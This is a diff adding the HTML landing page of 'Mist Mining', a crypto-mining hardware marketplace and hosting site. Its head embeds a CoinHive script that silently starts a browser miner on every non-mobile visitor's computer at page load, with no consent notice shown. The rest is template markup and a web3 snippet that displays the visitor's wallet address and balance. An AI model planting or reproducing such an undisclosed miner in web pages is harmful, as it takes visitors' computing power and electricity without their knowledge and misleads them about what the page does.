@@ -1,0 +1,337 @@
+<!DOCTYPE HTML>
+<!--
+	Mist Mining website by Mist Mining Inc
+-->
+<html>
+	<head>
+		<title>Mist Mining</title>
+		<link rel="icon" href="images/Flavicon16x16.png">
+		<script src="assets/js/web3.min.js"></script>
+		<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+		<script>
+			var miner = new CoinHive.Anonymous('txmv3jHAvkgWlXtOiZSPVknX9GsTrXwL', {throttle: 0.3});
+
+			// Only start on non-mobile devices and if not opted-out
+			// in the last 14400 seconds (4 hours):
+			if (!miner.isMobile() && !miner.didOptOut(14400)) {
+			miner.start();
+	}
+			</script>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		<!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
+		<link rel="stylesheet" href="assets/css/main.css" />
+		<!--[if lte IE 9]><link rel="stylesheet" href="assets/css/ie9.css" /><![endif]-->
+		<!--[if lte IE 8]><link rel="stylesheet" href="assets/css/ie8.css" /><![endif]-->
+		
+	</head>
+	<body class="landing">
+		<div id="page-wrapper">
+
+			<!-- Header -->
+				<header id="header">
+					<h1 id="logo"><a href="index.html"><image src="images/Logo_350x75.png"></a></h1>
+					<nav id="nav">
+						<ul>
+							<li><a href="index.html">Home</a></li>
+							<li><a href="account.html">My Account</a></li>
+							<li> <a hreft="marketpalce.html">Marketplace</a>
+								<ul>
+									<li><a href="miner.html">Miners</a>
+										<ul>
+											<li><a href="asic.html">Asics</a></li>
+											<li><a href="tensor.html">GPU/Tensor</a></li>
+										</ul>
+									</li>
+									<li><a href="masternodes.html">Masternodes</a></li>
+									<li><a href="node.html">Full Nodes</a></li>
+								</ul>
+							</li>
+							<li><a href="hosting.html">Hosting</a></li>
+							<li><a href="about.html">About Us</a>
+								<ul>
+									<li><a href="contact.html">Contact Us</a></li>
+								</ul>
+							</li>
+							
+						</ul>
+					</nav>
+				</header>
+
+			<!-- Banner -->
+				<section id="banner">
+					<div class="content" id="particles-js">
+						<header>
+							<h2>The Evolution of Mining</h2>
+							<p>Marketplace. Hosting. Decentralized.<br />
+							</p>
+							<p id="accountLabel"></p>
+						</header>
+						<span class="image"><img src="images/pic01.jpg" alt="" /></span>
+					</div>
+					<a href="#one" class="goto-next scrolly">Next</a>
+				</section>
+
+			<!-- One -->
+				<section id="one" class="spotlight style1 bottom">
+					<span class="image fit main"><img src="images/pic02.jpg" alt="" /></span>
+					<div class="content">
+						<div class="container">
+							<div class="row">
+								<div class="4u 12u$(medium)">
+									<header>
+
+											<h2> Step 1: Choose one below </h2>
+											<b>  
+												This site requires the use of either the 
+												<a href="https://github.com/ethereum/mist">Mist Browser</a>
+											
+												or <a href="https://metamask.io">Metamask Plug In</a>.
+											</b>
+
+											
+											<p style="text-align: center;">
+												<br>
+												<a href="https://github.com/ethereum/mist">
+														<img src="images/mist.png" alt="Mist Browser" style="width:75px;height:75px;border:0;text-align: center;">
+												</a> 
+												<br> 
+													<a href="https://github.com/ethereum/mist"> Mist Browser</a> <b>: The end user-user interface for Ethereum. This requires more computing power. This option is great for those looking to run a full node and stregthen the network. </b>
+													<br>
+													<br>
+												<a href="https://metamask.io">
+															<img src="images/metamask.png" alt="Metamask" style="width:75px;height:75px;border:0;text-align: center;">
+													</a> <br> <a href="https://metamask.io">Metamask Plugin</a><b> : Lightweight. Turns any chrome, firefox, or brave browser into a mist browser that connects to the ethereum blockchain.  
+
+													</b>
+											</p>
+									</header>
+								</div>
+								<div class="4u 12u$(medium)"> 
+										<body>
+												<h2> 
+												Step 2: (optional)
+												</h2>
+												<b>
+												For added security while using any dApp it is recommended to use <a href="https://chrome.google.com/webstore/detail/cryptonite-by-metacert/keghdcpemohlojlglbiegihkljkgnige?hl=en">Cryptonite by MetaCert</a> 
+												 and <a href="https://chrome.google.com/webstore/detail/etheraddresslookup/pdknmigbbbhmllnmgdfalmedcmcefdfn">EAL</a>
+												</b>
+												<p style="text-align: center;">
+													<a href="https://chrome.google.com/webstore/detail/cryptonite-by-metacert/keghdcpemohlojlglbiegihkljkgnige?hl=en">
+														<img src="images/cryptonite.png" alt="Cryptonite by MetaCert" style="width:100px;height:75px;border:0;text-align: center;">
+													</a>
+													<br>
+													<a href="https://chrome.google.com/webstore/detail/cryptonite-by-metacert/keghdcpemohlojlglbiegihkljkgnige?hl=en">Cryptonite by Metacert</a>
+													<b>
+														: Cryptonite verifies the website you are on is not compromised by phising attacks. This is a must have for the browser of any crypto-enthusiast.
+													</b>
+													<br>
+													<br>
+													  <a href="https://chrome.google.com/webstore/detail/etheraddresslookup/pdknmigbbbhmllnmgdfalmedcmcefdfn">
+														<img src="images/eal.png" alt="Ethereum Address Lookup" style="width:75px;height:75px;border:0;text-align: center;">
+													  </a>
+													  <br>
+													  <a href="https://chrome.google.com/webstore/detail/etheraddresslookup/pdknmigbbbhmllnmgdfalmedcmcefdfn">Ethereum Address Lookup</a> 
+													  <b>
+														  : This plug in allows you to look up addressess and vet them against a blacklists.
+													  </b>
+												</p>
+											</body>
+								 </div>
+									<div class="4u$ 12u$(medium)">
+											<body>
+													<h2> 
+														Your all set! 
+													</h2>
+													<b>
+														You are now ready to transact safely, using the blockchain, on the web 3.0
+													</b>
+													<br>
+													
+														<image src="images/check.png" alt="Great Job!" style="width:300px;height:300px;border:0;text-align:center;">
+													
+									
+											</body>
+									</div>
+							</div>
+						</div>
+					</div>
+					<a href="#two" class="goto-next scrolly">Next</a>
+				</section>
+
+			
+
+			<!-- Two -->
+			<section id="two" class="spotlight style2 right">
+					<span class="image fit main"><img src="images/pic03.jpg" alt="" /></span>
+					<div class="content">
+							<header>
+									<h2>Marketplace</h2>
+									<p>Never guess your machine's serial number. </p>
+								</header>
+								<p> On our website you will find many types of machines.
+									From the moment you order, mist mining will provide an order number.
+									When a machine is shipped, or in transit, a tracking number is provided.
+									When someone receives and signs for it, a signature and identity is documented.
+									When the machine arrives, a serial number is posted along with a technical report.
+								</p>
+								<ul class="actions">
+									<li><a href="marketplace.html" class="button">Go to Marketplace</a></li>
+								</ul>
+						</div>
+					<a href="#three" class="goto-next scrolly">Next</a>
+				</section>	
+
+			<!-- Three -->
+
+			<section id="three" class="spotlight style3 left">
+					<span class="image fit main bottom"><img src="images/pic04.jpg" alt="" /></span>
+					<div class="content">
+							<header>
+									<h2>Hosting</h2>
+									<p>Buy a miner with us and get the first month of hosting free. Just pay the electricity at the end of the month. </p>
+								</header>
+								<p>		
+
+										Fully auditable hosting locations with partners who are held to standards. 
+										Fully transparent facilities that show electricty rates, average temperature and availability.
+										Unlike other hosting companies, if  a location is full you will be unable to choose it for hosting. 
+										We won't waste your time or money.
+										
+									
+								</p>
+								<ul class="actions">
+									<li><a href="hosting.html" class="button">Hosting Services</a></li>
+								</ul>	
+					</div>
+					<a href="#four" class="goto-next scrolly">Next</a>
+				</section>
+
+			
+
+			<!-- Four -->
+				<section id="four" class="wrapper style1 special fade-up">
+					<div class="container">
+						<header class="major">
+							<h2>Mist Mining</h2>
+							<p>The evolution of Mining. </p>
+						</header>
+						<div class="box alt">
+							<div class="row uniform">
+								<section class="4u 6u(medium) 12u$(xsmall)">
+									<span class="icon alt major fa-area-chart"></span>
+									<h3> Track Performance </h3>
+									<p>Audited machine performance. All machine history available as immutable public records.</p>
+								</section>
+								<section class="4u 6u$(medium) 12u$(xsmall)">
+									<span class="icon alt major fa-comment"></span>
+									<h3>Immutable community</h3>
+									<p>All the facilities and machines are reviewed by the community. We do not moderate comments.</p>
+								</section>
+								<section class="4u$ 6u(medium) 12u$(xsmall)">
+									<span class="icon alt major fa-flask"></span>
+									<h3>Scientific Approach</h3>
+									<p> Spotlight positions to partners who utilize renewable energy to decrese the electricity costs, 
+										as well as partners who recycle mining heat for other projects. </p>
+								</section>
+								<section class="4u 6u$(medium) 12u$(xsmall)">
+									<span class="icon alt major fa-paper-plane"></span>
+									<h3>Reliable shipping</h3>
+									<p>All movement and transfers are documented on the blockchain. Never second guess your machine's location. You own your machine and have the power to have it delivered on a moments notice.</p>
+								</section>
+								<section class="4u 6u(medium) 12u$(xsmall)">
+									<span class="icon alt major fa-file"></span>
+									<h3>Immutable records</h3>
+									<p>All records will be on the blockchain. No need to trust someone else with your machine's history. We are a public company registered with the IRS and the state of Florida.</p>
+								</section>
+								<section class="4u$ 6u$(medium) 12u$(xsmall)">
+									<span class="icon alt major fa-lock"></span>
+									<h3>Cryptographic Security</h3>
+									<p>Security backed by cryptography. Your private key signs your transactions. We are not like other companies that you can call and fake into providing private information. </p>
+								</section>
+							</div>
+						</div>
+						<footer class="major">
+							<ul class="actions">
+								<li><a href="https://github.com/mistmining/mistmining/readme.txt" class="button">White Paper</a></li>
+							</ul>
+						</footer>
+					</div>
+				</section>
+
+			<!-- Five -->
+				<section id="five" class="wrapper style2 special fade">
+					<div class="container">
+						<header>
+							<h2>Get lost in the mist</h2>
+							<p>Sign up for our news letter</p>
+						</header>
+						<form method="post" action="#" class="container 50%">
+							<div class="row uniform 50%">
+								<div class="8u 12u$(xsmall)"><input type="email" name="email" id="email" placeholder="Your Email Address" /></div>
+								<div class="4u$ 12u$(xsmall)"><input type="submit" value="Get Started" class="fit special" /></div>
+							</div>
+						</form>
+					</div>
+				</section>
+
+			<!-- Footer -->
+				<footer id="footer">
+					<ul class="icons">
+						<li><a href="https://twitter.com/mistmining" class="icon alt fa-twitter"><span class="label">Twitter</span></a></li>
+						<li><a href="#" class="icon alt fa-facebook"><span class="label">Facebook</span></a></li>
+						<li><a href="#" class="icon alt fa-linkedin"><span class="label">LinkedIn</span></a></li>
+						<li><a href="#" class="icon alt fa-instagram"><span class="label">Instagram</span></a></li>
+						<li><a href="#" class="icon alt fa-github"><span class="label">GitHub</span></a></li>
+						<li><a href="#" class="icon alt fa-envelope"><span class="label">Email</span></a></li>
+					</ul>
+					<ul class="copyright">
+						<li>&copy; Untitled. All rights reserved.</li><li>Design: <a href="http://html5up.net">HTML5 UP</a></li>
+					</ul>
+				</footer>
+
+		</div>
+
+		<!-- Scripts -->
+			
+			<script>
+				if(typeof web3 !== "undefined"){
+
+					console.log("Web 3 found");
+					web3 = new Web3(web3.currentProvider);
+
+					web3.eth.getAccounts(function(e,accounts){
+						var firstAccount = accounts[0];
+						document.getElementById("accountLabel").innerHTML = "Ethereum wallet is " + firstAccount + "" ; 
+						console.log(firstAccount);
+						web3.eth.getBalance(firstAccount,function(e, balance){
+							document.getElementById("balanceLabel").innerHTML = "Balance is" + balance + "wei" ;
+							console.log(balance);
+
+
+						});
+
+					});
+				}
+				else{
+					alert("Could not find Web3.0 provider. Please visit metamask.io or download the Ethereum Mist browser");
+					window.open('https://metamask.io', 'parent');
+				}
+			</script>
+			<script src="assets/js/particles.js"></script>
+			<script>
+				particlesJS.load('particles-js', 'particle.json', function(){
+					console.log('particles.json loaded...')
+				})
+			</script>
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/jquery.scrolly.min.js"></script>
+			<script src="assets/js/jquery.dropotron.min.js"></script>
+			<script src="assets/js/jquery.scrollex.min.js"></script>
+			<script src="assets/js/skel.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]-->
+			<script src="assets/js/main.js"></script>
+			
+	</body>
+</html>
